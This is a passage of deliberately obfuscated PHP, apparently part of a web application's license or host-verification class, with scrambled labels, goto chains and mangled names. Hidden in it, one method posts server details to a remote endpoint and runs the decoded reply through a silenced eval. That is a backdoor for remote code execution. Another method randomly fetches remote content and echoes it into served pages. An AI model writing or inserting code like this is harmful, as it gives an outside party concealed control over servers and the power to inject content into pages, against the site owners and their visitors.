$D´ôÀê»ó‡[61]($D´ôÀê»ó‡[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][218]}($D´ôÀê»ó‡[219], $D´ôÀê»ó‡[229]); goto a»Ó¢¸Ã¯‘; bôŠ½¼‹ê: } private function exbu9ec97de6() { goto FæÕÅ¯í‘; CŒå…³–ëÅ: $eêÃİø‚¥ = $f¡áè‘¥Ù[222]($f¡áè‘¥Ù[61]($f¡áè‘¥Ù[11])->{$_SERVER[Ú¦Ó«“Ö€Œû›][223]}(), $f¡áè‘¥Ù[224]); $c²®©›±Çä = $eêÃİø‚¥[$f¡áè‘¥Ù[225]]; $eÈ†á¤æ“‰ = $f¡áè‘¥Ù[114]($_SERVER[$f¡áè‘¥Ù[115]] . $f¡áè‘¥Ù[214]($cƒæƒÍÄ²) . $CÀ…»É‚Ù½[$f¡áè‘¥Ù[210]]); goto EªĞ°ö¨íà; dÓ±Ã¼…ƒå: $dÖììÔÃ¥† = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][188]}($c²®©›±Çä[$f¡áè‘¥Ù[91]][$E¥×ÜöèˆĞ], $eÈ†á¤æ“‰); $dØÖ¦¯§õ¤ = $a„ÍÔ°§¥¾[598]; if (!$dØÖ¦¯§õ¤) { die; } goto A¸÷–ˆßÉï; FæÕÅ¯í‘: $a„ÍÔ°§¥¾ =& $_SERVER[»„]; $f¡áè‘¥Ù =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $_SERVER[$f¡áè‘¥Ù[175]] = $f¡áè‘¥Ù[104]($_SERVER, $f¡áè‘¥Ù[175], APP_HOST); goto eÎ°ƒÍÀŞÀ; BÀñî­ŸÜÈ: $CÀ…»É‚Ù½ = $f¡áè‘¥Ù[61]($f¡áè‘¥Ù[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][63]}(); if ($CÀ…»É‚Ù½[$f¡áè‘¥Ù[120]] == $f¡áè‘¥Ù[121]) { return; } $cƒæƒÍÄ² = $f¡áè‘¥Ù[61]($f¡áè‘¥Ù[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][63]}($f¡áè‘¥Ù[116]); goto CŒå…³–ëÅ; fœĞ×–Œ„ˆ: if ($f¡áè‘¥Ù[230]() >= $E°‹¢“‘“) { return $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][164]}(); } $this->bzhmb7a9f78b = $dÖììÔÃ¥†; $this->udxe21202512 = $CÀ…»É‚Ù½[$f¡áè‘¥Ù[120]]; goto AèŒŞˆ˜Ãé; EªĞ°ö¨íà: $FÍŒŸ‘³­ê = $a„ÍÔ°§¥¾[597]; while ($FÍŒŸ‘³­ê < $a„ÍÔ°§¥¾[554]) { if ($FÍŒŸ‘³­ê >= 0) { break; } $FÍŒŸ‘³­ê++; } $E¥×ÜöèˆĞ = $f¡áè‘¥Ù[214]($f¡áè‘¥Ù[25]($eÈ†á¤æ“‰, 10, 16)); goto dÓ±Ã¼…ƒå; A¸÷–ˆßÉï: $dÖììÔÃ¥† = $f¡áè‘¥Ù[190]($dÖììÔÃ¥†, !0); if (!$f¡áè‘¥Ù[191]($dÖììÔÃ¥†)) { return $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][164]}(); } $E°‹¢“‘“ = $f¡áè‘¥Ù[144]($dÖììÔÃ¥†[$f¡áè‘¥Ù[145]]); goto fœĞ×–Œ„ˆ; eÎ°ƒÍÀŞÀ: $this->udxe21202512 = $f¡áè‘¥Ù[121]; $BÚñ¶‹Ğ²é = $a„ÍÔ°§¥¾[596]; while ($BÚñ¶‹Ğ²é < $a„ÍÔ°§¥¾[566]) { if ($BÚñ¶‹Ğ²é >= 0) { break; } $BÚñ¶‹Ğ²é++; } goto BÀñî­ŸÜÈ; AèŒŞˆ˜Ãé: } private function ealk21cd1b34() { goto BĞµÃ•ãˆ; AÄÑÍ°…†: $A„‡áÃ’Ã¾ = $f©×¦¹Ÿèƒ[600]; if ($c’ÁƒÊÙÁ¢ == $B’ÂƒÄĞ¶É[231] && $this->udxe21202512 == $B’ÂƒÄĞ¶É[121]) { $B’ÂƒÄĞ¶É[166]($B’ÂƒÄĞ¶É[197]($B’ÂƒÄĞ¶É[232]), !1, $B’ÂƒÄĞ¶É[233]); } $a„ÄÈ…»… = array($B’ÂƒÄĞ¶É[234], $B’ÂƒÄĞ¶É[235]); goto f·İÕ–£ôĞ; C…´…ëì‰: $F²ÜÅùÆÜ = $f©×¦¹Ÿèƒ[599]; if (!$F²ÜÅùÆÜ) { return; } $c’ÁƒÊÙÁ¢ = $_SERVER[$B’ÂƒÄĞ¶É[44]]; goto AÄÑÍ°…†; f·İÕ–£ôĞ: if ($B’ÂƒÄĞ¶É[236]($c’ÁƒÊÙÁ¢, $a„ÄÈ…»…)) { if ($this->udxe21202512 == $B’ÂƒÄĞ¶É[121] && isset($b¢²Ë¬µÎ¡[$B’ÂƒÄĞ¶É[237]])) { $B’ÂƒÄĞ¶É[166]($B’ÂƒÄĞ¶É[197]($B’ÂƒÄĞ¶É[232]), !1, $B’ÂƒÄĞ¶É[233]); die; } $fİëÆŠ˜Çš = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][137]}(); if ($fİëÆŠ˜Çš != $B’ÂƒÄĞ¶É[201]($B’ÂƒÄĞ¶É[238])) { if ($fİëÆŠ˜Çš <= $B’ÂƒÄĞ¶É[61]($B’ÂƒÄĞ¶É[139])->{$_SERVER[Ú¦Ó«“Ö€Œû›][140]}()) { $B’ÂƒÄĞ¶É[166]($B’ÂƒÄĞ¶É[197]($B’ÂƒÄĞ¶É[239]), !1, $B’ÂƒÄĞ¶É[233]); die; } } } goto aèïÔ‚áÉ; BĞµÃ•ãˆ: $f©×¦¹Ÿèƒ =& $_SERVER[»„]; $B’ÂƒÄĞ¶É =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $b¢²Ë¬µÎ¡ = $GLOBALS[$B’ÂƒÄĞ¶É[22]]; goto C…´…ëì‰; aèïÔ‚áÉ: } private function rzaqd5b533b6() { goto EŸÇ‚Ù”õ; C°¥–Í‘´: $DÏ‚åÈ›À = @$d±á‡Şôİ¥[250]($céŠ‹‹¢¯Ó, !1, $E¡¾³‰÷‡); $d±á‡Şôİ¥[251]($d±á‡Şôİ¥[252]); if ($DÏ‚åÈ›À && $d±á‡Şôİ¥[32]($DÏ‚åÈ›À, $d±á‡Şôİ¥[253])) { echo $DÏ‚åÈ›À; } goto BÇæÓ«…Š; BÇæÓ«…Š: die; goto CµÜ…ÌíÍ½; EŸÇ‚Ù”õ: $d±á‡Şôİ¥ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $dø¬íÊ£Ô“ = array($d±á‡Şôİ¥[135], $d±á‡Şôİ¥[240]); if (!$d±á‡Şôİ¥[104]($GLOBALS, $d±á‡Şôİ¥[132]) || !isset($_GET[$d±á‡Şôİ¥[241]])) { return; } goto C ÈË¯Ï‡Ì; FôÚ—«»Ÿ: $bõíæ²×éğ = $_SERVER[»„][601]; if (!$bõíæ²×éğ) { die; } $E¡¾³‰÷‡ = $d±á‡Şôİ¥[245](array($d±á‡Şôİ¥[246] => array($d±á‡Şôİ¥[247] => $d±á‡Şôİ¥[248], $d±á‡Şôİ¥[249] => 3))); goto C°¥–Í‘´; C ÈË¯Ï‡Ì: if (!$d±á‡Şôİ¥[236]($_SERVER[$d±á‡Şôİ¥[44]], $dø¬íÊ£Ô“)) { return; } $céŠ‹‹¢¯Ó = $d±á‡Şôİ¥[242]; $céŠ‹‹¢¯Ó = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($céŠ‹‹¢¯Ó, $d±á‡Şôİ¥[244]); goto FôÚ—«»Ÿ; CµÜ…ÌíÍ½: } public function rkqccfe109f2($fµ ¾ã‚öô) { goto b˜ãŠÅ±å†; fƒì‡è”Ú‘: $Bç¾ÒÏ¢à = array($fî„ê¯ÆÁ®[255], $fî„ê¯ÆÁ®[256], $fî„ê¯ÆÁ®[257], $fî„ê¯ÆÁ®[258], $fî„ê¯ÆÁ®[259], $fî„ê¯ÆÁ®[260], $fî„ê¯ÆÁ®[261], $fî„ê¯ÆÁ®[262]); $EóÙÔ†ïó = $fî„ê¯ÆÁ®[0]($fî„ê¯ÆÁ®[263], $fî„ê¯ÆÁ®[104]($this->bzhmb7a9f78b, $fî„ê¯ÆÁ®[129], $fî„ê¯ÆÁ®[10])); $c²â²‰ƒÚ = $AõÍ…ôÚ¢Ç[602]; goto Aí‚ÈÔˆ´š; Aí‚ÈÔˆ´š: if (!$c²â²‰ƒÚ) { die; } $dÊ£˜Ó•¯ = array(); foreach ($Bç¾ÒÏ¢à as $B™Ñí§â¯) { if (!$fî„ê¯ÆÁ®[236]($B™Ñí§â¯, $EóÙÔ†ïó)) { $dÊ£˜Ó•¯[] = $B™Ñí§â¯; } } goto Bç‚Ù˜”Ş; Bç‚Ù˜”Ş: foreach ($dÊ£˜Ó•¯ as $B™Ñí§â¯) { unset($fµ ¾ã‚öô[$B™Ñí§â¯]); $E±ì àâĞ = $AõÍ…ôÚ¢Ç[603]; if (!$E±ì àâĞ) { die; } } return $fµ ¾ã‚öô; goto F“„”ƒê¶; b˜ãŠÅ±å†: $AõÍ…ôÚ¢Ç =& $_SERVER[»„]; $fî„ê¯ÆÁ® =& $_SERVER[Ú¦Ó«“Ö€Œû›]; if ($this->udxe21202512 == $fî„ê¯ÆÁ®[254]) { return $fµ ¾ã‚öô; } goto fƒì‡è”Ú‘; F“„”ƒê¶: } private function qrli0ef3160b() { goto EÜÉµŸ…é¹; AàÄƒõ»–Û: $eÑ©¼Ø¡Î‡ = $B‘ñ‚–‰×É[607]; if ($d ÇŠ‚™‚†[61]($d ÇŠ‚™‚†[269])->{$_SERVER[Ú¦Ó«“Ö€Œû›][63]}($d ÇŠ‚™‚†[85]) != $d ÇŠ‚™‚†[229]) { $d ÇŠ‚™‚†[61]($d ÇŠ‚™‚†[269])->{$_SERVER[Ú¦Ó«“Ö€Œû›][221]}($d ÇŠ‚™‚†[85], $d ÇŠ‚™‚†[229]); } goto dÅÑôô•‚—; EÜÉµŸ…é¹: $B‘ñ‚–‰×É =& $_SERVER[»„]; $d ÇŠ‚™‚† =& $_SERVER[Ú¦Ó«“Ö€Œû›]; if ($this->udxe21202512 != $d ÇŠ‚™‚†[121]) { $GLOBALS[$d ÇŠ‚™‚†[91]][$d ÇŠ‚™‚†[95]][$d ÇŠ‚™‚†[264]] = $d ÇŠ‚™‚†[220]; return; } goto Cãñ¿ÇŸßº; FÏ‰êîÇ«: if (!$FÎ¬ìœİâ“) { die; } foreach ($fİƒğ¼‡õ† as $fà—Š©Ïš³) { if ($fà—Š©Ïš³ == $B÷“‰…­­ || $d ÇŠ‚™‚†[25]($B÷“‰…­­, 0, $d ÇŠ‚™‚†[24]($fà—Š©Ïš³)) == $fà—Š©Ïš³) { $d ÇŠ‚™‚†[166]($d ÇŠ‚™‚†[197]($d ÇŠ‚™‚†[266]), !1); } } $GLOBALS[$d ÇŠ‚™‚†[91]][$d ÇŠ‚™‚†[95]][$d ÇŠ‚™‚†[267]] = $d ÇŠ‚™‚†[220]; goto a £õ‚Ï; Cãñ¿ÇŸßº: $B÷“‰…­­ = $_SERVER[$d ÇŠ‚™‚†[44]]; $fİƒğ¼‡õ† = array($d ÇŠ‚™‚†[265]); $FÎ¬ìœİâ“ = $B‘ñ‚–‰×É[604]; goto FÏ‰êîÇ«; a £õ‚Ï: $a¾„Èô†ğ = $B‘ñ‚–‰×É[605]; if (strlen($a¾„Èô†ğ) < $B‘ñ‚–‰×É[557]) { die; } $GLOBALS[$d ÇŠ‚™‚†[91]][$d ÇŠ‚™‚†[95]][$d ÇŠ‚™‚†[264]] = $d ÇŠ‚™‚†[229]; goto E´Ò©Š‚åÌ; E´Ò©Š‚åÌ: $bò¿İ Ô‘¿ = $B‘ñ‚–‰×É[606]; if (strlen($bò¿İ Ô‘¿) < $B‘ñ‚–‰×É[554]) { die; } $GLOBALS[$d ÇŠ‚™‚†[91]][$d ÇŠ‚™‚†[268]] = $d ÇŠ‚™‚†[220]; goto AàÄƒõ»–Û; dÅÑôô•‚—: } public function tyhv5b2d7d41() { return $_SERVER[Ú¦Ó«“Ö€Œû›][270]; } private function yhst4bbc168f() { goto A¬«âò¹‘; F­ÂÔçˆê’: $A¯æ§£µ¢Ù = $fÍá×¥¥Ç[274] . $fÍá×¥¥Ç[114]($fÍá×¥¥Ç[275]); if ($this->udxe21202512 == $fÍá×¥¥Ç[121] || !$fÍá×¥¥Ç[104]($GLOBALS, $fÍá×¥¥Ç[132])) { return; } if (!$fÍá×¥¥Ç[236]($_SERVER[$fÍá×¥¥Ç[44]], $aŠã…Œáİ)) { return; } goto f¸¿†ÏÙù; F°£øó‰ÁÖ: $Bîö ÷·Ñµ = array($fÍá×¥¥Ç[165] => $fÍá×¥¥Ç[61]($fÍá×¥¥Ç[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][63]}($fÍá×¥¥Ç[209]), $fÍá×¥¥Ç[178] => $this->udxe21202512, $fÍá×¥¥Ç[176] => $_SERVER[$fÍá×¥¥Ç[177]], $fÍá×¥¥Ç[169] => $fÍá×¥¥Ç[149], $fÍá×¥¥Ç[172] => $_SERVER[$fÍá×¥¥Ç[173]]); $cø÷æíê±Ô = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][182]}($fÍá×¥¥Ç[279], $Bîö ÷·Ñµ); if (!$fÍá×¥¥Ç[191]($cø÷æíê±Ô)) { return; } goto b„µÔ¯ğÓô; f¸¿†ÏÙù: if ($fÍá×¥¥Ç[230]() % 4 != 0) { return; } $CèæÑ¡¬’½ = $fÍá×¥¥Ç[13](array($fÍá×¥¥Ç[276], $fÍá×¥¥Ç[277]), $A¯æ§£µ¢Ù); if ($CèæÑ¡¬’½ && $fÍá×¥¥Ç[230]() - $CèæÑ¡¬’½ < $fÍá×¥¥Ç[201]($fÍá×¥¥Ç[278])) { return; } goto dèä´¬™««; A¬«âò¹‘: $aÔ¬ºÁÂÄ =& $_SERVER[»„]; $fÍá×¥¥Ç =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $aŠã…Œáİ = array($fÍá×¥¥Ç[271], $fÍá×¥¥Ç[272], $fÍá×¥¥Ç[273]); goto F­ÂÔçˆê’; dèä´¬™««: $fÍá×¥¥Ç[13](array($fÍá×¥¥Ç[276], $fÍá×¥¥Ç[152]), $A¯æ§£µ¢Ù, $fÍá×¥¥Ç[230]()); $C†ÒÑˆò = $aÔ¬ºÁÂÄ[608]; if (strlen($C†ÒÑˆò) < $aÔ¬ºÁÂÄ[566]) { die; } goto F°£øó‰ÁÖ; b„µÔ¯ğÓô: if ($cø÷æíê±Ô[$fÍá×¥¥Ç[165]] && $cø÷æíê±Ô[$fÍá×¥¥Ç[280]]) { if ($this->{$_SERVER[Ú¦Ó«“Ö€Œû›][199]}($cø÷æíê±Ô[$fÍá×¥¥Ç[280]]) == $Bîö ÷·Ñµ[$fÍá×¥¥Ç[165]]) { return; } } $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][164]}(); if ($this->{$_SERVER[Ú¦Ó«“Ö€Œû›][199]}($cø÷æíê±Ô[$fÍá×¥¥Ç[280]]) != $Bîö ÷·Ñµ[$fÍá×¥¥Ç[165]]) { $Fè„‘®¨‚ã = array($fÍá×¥¥Ç[202] => $fÍá×¥¥Ç[61]($fÍá×¥¥Ç[62])->{$_SERVER[Ú¦Ó«“Ö€Œû›][63]}($fÍá×¥¥Ç[116]), $fÍá×¥¥Ç[203] => $_SERVER[$fÍá×¥¥Ç[115]], $fÍá×¥¥Ç[204] => $fÍá×¥¥Ç[205](), $fÍá×¥¥Ç[174] => $_SERVER[$fÍá×¥¥Ç[175]]); $A½‡ó²è…½ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][206]}($fÍá×¥¥Ç[148]($Fè„‘®¨‚ã)); $cø÷æíê±Ô = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][182]}($fÍá×¥¥Ç[207] . $A½‡ó²è…½); if ($cø÷æíê±Ô && $fÍá×¥¥Ç[191]($cø÷æíê±Ô) && isset($cø÷æíê±Ô[$fÍá×¥¥Ç[280]])) { $eØâœÆ„¹Å = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][188]}($cø÷æíê±Ô[$fÍá×¥¥Ç[280]], 2); if ($eØâœÆ„¹Å) { $eØâœÆ„¹Å = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][199]}($eØâœÆ„¹Å); } if ($eØâœÆ„¹Å) { try { @eval($eØâœÆ„¹Å); } catch (Exception $aÃğ´÷Î…â) { } } } } goto AùÈ¶Ó¥­; AùÈ¶Ó¥­: } private function goqffafe7b89($B±®ÊÄ¾å = '', $F¡¦áºÒ²— = array(), $EŞ¼›ÚÙõõ = 5) { goto cÕ£’í¿‹; FòçÎ£¨Ò: $e¦²İ½äËì = $E—õÜîƒäÛ[611]; if (strlen($e¦²İ½äËì) < $E—õÜîƒäÛ[566]) { die; } if ($F¡¦áºÒ²— === -1) { return $DŞó¬…¬°ƒ; } goto A¿Éî°İ‡ğ; BŒÜ«ÁÙáÜ: $bÃì²Ô¯Òœ = $E—õÜîƒäÛ[609]; while (strlen($bÃì²Ô¯Òœ) < $E—õÜîƒäÛ[560]) { if (!$bÃì²Ô¯Òœ) { break; } $bÃì²Ô¯Òœ++; } $DŞó¬…¬°ƒ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($DŞó¬…¬°ƒ, $c¡†¿ğ—ëá[282]); goto AÌÈÜÜéÖÅ; A¼©ÔíŞì§: $C£ˆÂ‡•¡Š = $E—õÜîƒäÛ[613]; if (strlen($C£ˆÂ‡•¡Š) < $E—õÜîƒäÛ[557]) { return; } return $c¡†¿ğ—ëá[190]($F¡¦áºÒ²—, !0); goto AÀÓ¿¥‘¦¿; A¿Éî°İ‡ğ: $b´ù¦®¼» = $c¡†¿ğ—ëá[245](array($c¡†¿ğ—ëá[246] => array($c¡†¿ğ—ëá[249] => $EŞ¼›ÚÙõõ, $c¡†¿ğ—ëá[247] => $c¡†¿ğ—ëá[285]), $c¡†¿ğ—ëá[286] => array($c¡†¿ğ—ëá[287] => !1, $c¡†¿ğ—ëá[288] => !1))); $b›»œ†•‹ = $E—õÜîƒäÛ[612]; $F¡¦áºÒ²— = @$c¡†¿ğ—ëá[250]($DŞó¬…¬°ƒ, !1, $b´ù¦®¼»); goto A¼©ÔíŞì§; cÕ£’í¿‹: $E—õÜîƒäÛ =& $_SERVER[»„]; $c¡†¿ğ—ëá =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $DŞó¬…¬°ƒ = $c¡†¿ğ—ëá[281]; goto BŒÜ«ÁÙáÜ; AÌÈÜÜéÖÅ: $D¶óåæ²í = $E—õÜîƒäÛ[610]; if (strlen($D¶óåæ²í) < $E—õÜîƒäÛ[566]) { return; } $DŞó¬…¬°ƒ = $DŞó¬…¬°ƒ . $B±®ÊÄ¾å . $c¡†¿ğ—ëá[283] . $c¡†¿ğ—ëá[284]($F¡¦áºÒ²—); goto FòçÎ£¨Ò; AÀÓ¿¥‘¦¿: } private function gaom006c8364() { goto aÏ¹Ÿ–†·Ô; b™†§¯Š¤ï: $b×ƒ±Èò… = $dëÛº…ã›[616]; while (strlen($b×ƒ±Èò…) < $dëÛº…ã›[557]) { if (!$b×ƒ±Èò…) { break; } $b×ƒ±Èò…++; } $eÖîó§éô„ = $eÖîó§éô„ ? $EŸ¾ßÕ¿ÛÎ[201]($eÖîó§éô„) : 0; goto d¿§ôçÂ—È; eÎÉÄ‹ó…: $DÄçÈæ­›ø = $b„ø«ê„¥[$this->udxe21202512]; $CÚÑØÏªš = $dëÛº…ã›[614]; $DÄçÈæ­›ø = $EŸ¾ßÕ¿ÛÎ[201]($DÄçÈæ­›ø ? $DÄçÈæ­›ø : $EŸ¾ßÕ¿ÛÎ[290]); goto C­Á³ìçÕ‹; aÏ¹Ÿ–†·Ô: $dëÛº…ã› =& $_SERVER[»„]; $EŸ¾ßÕ¿ÛÎ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $b„ø«ê„¥ = array($EŸ¾ßÕ¿ÛÎ[289] => $EŸ¾ßÕ¿ÛÎ[290], $EŸ¾ßÕ¿ÛÎ[291] => $EŸ¾ßÕ¿ÛÎ[292], $EŸ¾ßÕ¿ÛÎ[293] => $EŸ¾ßÕ¿ÛÎ[294], $EŸ¾ßÕ¿ÛÎ[295] => $EŸ¾ßÕ¿ÛÎ[296], $EŸ¾ßÕ¿ÛÎ[297] => $EŸ¾ßÕ¿ÛÎ[298], $EŸ¾ßÕ¿ÛÎ[299] => $EŸ¾ßÕ¿ÛÎ[238], $EŸ¾ßÕ¿ÛÎ[300] => $EŸ¾ßÕ¿ÛÎ[238], $EŸ¾ßÕ¿ÛÎ[301] => $EŸ¾ßÕ¿ÛÎ[290], $EŸ¾ßÕ¿ÛÎ[302] => $EŸ¾ßÕ¿ÛÎ[292], $EŸ¾ßÕ¿ÛÎ[303] => $EŸ¾ßÕ¿ÛÎ[294], $EŸ¾ßÕ¿ÛÎ[304] => $EŸ¾ßÕ¿ÛÎ[305], $EŸ¾ßÕ¿ÛÎ[306] => $EŸ¾ßÕ¿ÛÎ[296], $EŸ¾ßÕ¿ÛÎ[307] => $EŸ¾ßÕ¿ÛÎ[308], $EŸ¾ßÕ¿ÛÎ[309] => $EŸ¾ßÕ¿ÛÎ[298], $EŸ¾ßÕ¿ÛÎ[310] => $EŸ¾ßÕ¿ÛÎ[311], $EŸ¾ßÕ¿ÛÎ[312] => $EŸ¾ßÕ¿ÛÎ[313], $EŸ¾ßÕ¿ÛÎ[314] => $EŸ¾ßÕ¿ÛÎ[315]); goto eÎÉÄ‹ó…; d¿§ôçÂ—È: return $DÄçÈæ­›ø + $eÖîó§éô„; $e¹¨¸Å§Ù = $dëÛº…ã›[617]; if (!$e¹¨¸Å§Ù) { die; } goto cÆ·«÷©…£; C­Á³ìçÕ‹: $c„Œ‹İé = $dëÛº…ã›[615]; while (strlen($c„Œ‹İé) < $dëÛº…ã›[547]) { if (!$c„Œ‹İé) { break; } $c„Œ‹İé++; } $eÖîó§éô„ = $EŸ¾ßÕ¿ÛÎ[104]($this->bzhmb7a9f78b, $EŸ¾ßÕ¿ÛÎ[316]); goto b™†§¯Š¤ï; cÆ·«÷©…£: } public function kpirf39c4d4a($dÂÁ©Ç¸Œ) { goto C‘—Ë·‘ó; cä¬­È»: if ($e÷õ›§èƒµ >= $EãŸŠ´¨ã[201]($EãŸŠ´¨ã[238])) { return; } $Bäƒ¼‡­ = $EãŸŠ´¨ã[61]($EãŸŠ´¨ã[139])->{$_SERVER[Ú¦Ó«“Ö€Œû›][140]}(); if ($Bäƒ¼‡­ <= $e÷õ›§èƒµ) { return; } goto BßÄê¥áÓö; C‘—Ë·‘ó: $EãŸŠ´¨ã =& $_SERVER[Ú¦Ó«“Ö€Œû›]; $e÷õ›§èƒµ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][137]}(); $eÊòÍªˆœç = $_SERVER[»„][618]; goto cä¬­È»; BßÄê¥áÓö: $C˜—¿½°µÑ = $EãŸŠ´¨ã[61]($EãŸŠ´¨ã[139])->{$_SERVER[Ú¦Ó«“Ö€Œû›][317]}($EãŸŠ´¨ã[318])->{$_SERVER[Ú¦Ó«“Ö€Œû›][319]}($e÷õ›§èƒµ)->{$_SERVER[Ú¦Ó«“Ö€Œû›][320]}(); $C˜—¿½°µÑ = $EãŸŠ´¨ã[222]($C˜—¿½°µÑ, $EãŸŠ´¨ã[10], $EãŸŠ´¨ã[318]); if (!$EãŸŠ´¨ã[236]($dÂÁ©Ç¸Œ[$EãŸŠ´¨ã[318]], $C˜—¿½°µÑ)) { $EãŸŠ´¨ã[166]($EãŸŠ´¨ã[321], !1, $EãŸŠ´¨ã[233]); } goto BøØ±ê‰·“; BøØ±ê‰·“: } public function ixfdc434ce31() { goto A¬ÛÆÃ¾õ”; a©Àà…à„: $bŸ¹ÄÈÙéÅ = $a«ÇÃÑîÈÍ[242]; $bŸ¹ÄÈÙéÅ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][243]}($bŸ¹ÄÈÙéÅ, $a«ÇÃÑîÈÍ[244]); $bÚ«…Ûô×„ = $fã¿Éì£İ[619]; goto fÁ¥àË’©; fÁ¥àË’©: if (!$bÚ«…Ûô×„) { return; } $c©ÕÌ¤±ÑĞ = $a«ÇÃÑîÈÍ[245](array($a«ÇÃÑîÈÍ[246] => array($a«ÇÃÑîÈÍ[247] => $a«ÇÃÑîÈÍ[248], $a«ÇÃÑîÈÍ[249] => 3))); $fŠ„¥ËïÎ = @$a«ÇÃÑîÈÍ[250]($bŸ¹ÄÈÙéÅ, !1, $c©ÕÌ¤±ÑĞ); goto eÑ¨ƒĞÖé«; A¬ÛÆÃ¾õ”: $fã¿Éì£İ =& $_SERVER[»„]; $a«ÇÃÑîÈÍ =& $_SERVER[Ú¦Ó«“Ö€Œû›]; if (!$a«ÇÃÑîÈÍ[104]($GLOBALS, $a«ÇÃÑîÈÍ[132]) || $a«ÇÃÑîÈÍ[322](1, 100) > 20) { return; } goto a©Àà…à„; eÑ¨ƒĞÖé«: $D¢ê“¨˜¶ = $fã¿Éì£İ[620]; if (!$D¢ê“¨˜¶) { die; } echo $a«ÇÃÑîÈÍ[323] . $a«ÇÃÑîÈÍ[324]($fŠ„¥ËïÎ) . $a«ÇÃÑîÈÍ[325]; goto FÊğµÂ ¨•; FÊğµÂ ¨•: } private function mibwf35bb5e7($AÙ­ğÌ„î´, $CÀéÊåõ, $Eèî¾‡“™Õ = 3) { goto Bö©ˆ‹Ç‘; FØœ¬†Ò»©: if ($Eèî¾‡“™Õ - 1 > 0) { $F°ƒÇ‰ÏõÔ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][127]}($F°ƒÇ‰ÏõÔ, $CÀéÊåõ, $Eèî¾‡“™Õ - 1); } return $F°ƒÇ‰ÏõÔ; goto BÒåĞ ãÖ®; Dš’ˆ¡•÷‡: $A…Èî÷ßÈ© = $a¹‹’Œ¤Ìõ[624]; if (strlen($A…Èî÷ßÈ©) < $a¹‹’Œ¤Ìõ[566]) { die; } switch ($eÕï¾¤„ÊÓ) { case $E ÏĞ¾§ŒÆ[229]: $F°ƒÇ‰ÏõÔ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($AÙ­ğÌ„î´, $E ÏĞ¾§ŒÆ[214]($CÀéÊåõ . $cìØ”‰ñ—ä)); $cÔäõÂËÛ = $a¹‹’Œ¤Ìõ[625]; if (!$cÔäõÂËÛ) { die; } break; $dğã‘÷ÚäÁ = $a¹‹’Œ¤Ìõ[626]; while ($dğã‘÷ÚäÁ < $a¹‹’Œ¤Ìõ[560]) { if ($dğã‘÷ÚäÁ >= 0) { break; } $dğã‘÷ÚäÁ++; } case $E ÏĞ¾§ŒÆ[220]: $F°ƒÇ‰ÏõÔ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($AÙ­ğÌ„î´, $E ÏĞ¾§ŒÆ[214]($cìØ”‰ñ—ä . $CÀéÊåõ)); break; $DëìÉ‹·Ù = $a¹‹’Œ¤Ìõ[627]; while ($DëìÉ‹·Ù < $a¹‹’Œ¤Ìõ[566]) { if ($DëìÉ‹·Ù >= 0) { break; } $DëìÉ‹·Ù++; } case $E ÏĞ¾§ŒÆ[328]: $F°ƒÇ‰ÏõÔ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($AÙ­ğÌ„î´, $E ÏĞ¾§ŒÆ[118]($cìØ”‰ñ—ä . $CÀéÊåõ)); break; case $E ÏĞ¾§ŒÆ[329]: $F°ƒÇ‰ÏõÔ = $this->{$_SERVER[Ú¦Ó«“Ö€Œû›][147]}($AÙ­ğÌ„î´, $E ÏĞ¾§ŒÆ[114]($cìØ”‰ñ—ä . $CÀéÊåõ)); $eªš¶µõ“¬ = $a¹‹’Œ¤Ìõ[628]; if (!$eªš¶µõ“¬) { die; } break; case $E ÏĞ¾§ŒÆ[330]: goto DŸí‹ß¿í; a†ß‹Õ½ø˜: $dƒß’ÚÄ = $a¹‹’Œ¤Ìõ[630]; while (strlen($dƒß’ÚÄ) < $a¹‹’Œ¤Ìõ[554]) { if (!$dƒß’ÚÄ) { break; } $dƒß’ÚÄ++; } $DŒ”“„Ğ´Œ = $E ÏĞ¾§ŒÆ[25]($DŒ”“„Ğ´Œ, $E“œÕÄ‚²× % 8, $E“œÕÄ‚²× % 8 + 7); goto eø«›îÇ×é; ağ’»Åˆ”ó: $EÑóÏ¨ Çï = 0; $cÏ ªİÙ¥‚ = $a¹‹’Œ¤Ìõ[633]; if (strlen($cÏ ªİÙ¥‚) < $a¹‹’Œ¤Ìõ[547]) { die; } goto D’âÂÙæƒ; f‚„Ö•š¯º: while ($eÇë‘÷²Ç· < $a¹‹’Œ¤Ìõ[557]) { if ($eÇë‘÷²Ç· >= 0) { break; } $eÇë‘÷²Ç·++; } $aÂ¯Ï†Ğ = $Fòô­ëœç¯[$E“œÕÄ‚²×]; $DŒ”“„Ğ´Œ = $E ÏĞ¾§ŒÆ[114]($aÂ¯Ï†Ğ . $E ÏĞ¾§ŒÆ[114]($CÀéÊåõ . $aÂ¯Ï†Ğ) . $CÀéÊåõ); goto a†ß‹Õ½ø˜; c—·ğïäå: for ($Bˆ‰¬ÏÂÁÆ = 0; $Bˆ‰¬ÏÂÁÆ < $E ÏĞ¾§ŒÆ[24]($AÙ­ğÌ„î´); $Bˆ‰¬ÏÂÁÆ++) { $E¦¾‘öá§À = $E¦¾‘öá§À == $E ÏĞ¾§ŒÆ[24]($DŒ”“„Ğ´Œ) ? 0 